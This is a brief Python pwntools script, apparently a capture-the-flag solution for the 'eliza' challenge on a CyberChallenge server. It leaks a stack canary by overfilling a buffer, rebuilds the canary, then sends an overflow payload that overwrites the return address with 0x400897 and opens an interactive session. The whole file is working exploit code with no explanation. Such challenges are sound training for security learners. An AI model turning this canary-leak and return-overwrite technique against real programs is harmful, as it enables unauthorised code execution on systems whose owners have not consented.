from pwn import *
r = remote("eliza.challs.cyberchallenge.it", 9131)


content= r.recvuntil(b"anything...\n")


e = b"a"*0x49
r.send(e)

leak= r.recvline()
print(leak)

canary = b'\x00' + leak[0x49+8:0x49+7+8]

#print(str(leak.hex()))
#print(canary.hex())

e=b'a'* 0x48 + canary + b'b'*8 + p64(0x400897)
r.send(e)
content= r.recvuntil(b"anything...\n")
r.sendline()
r.interactive()
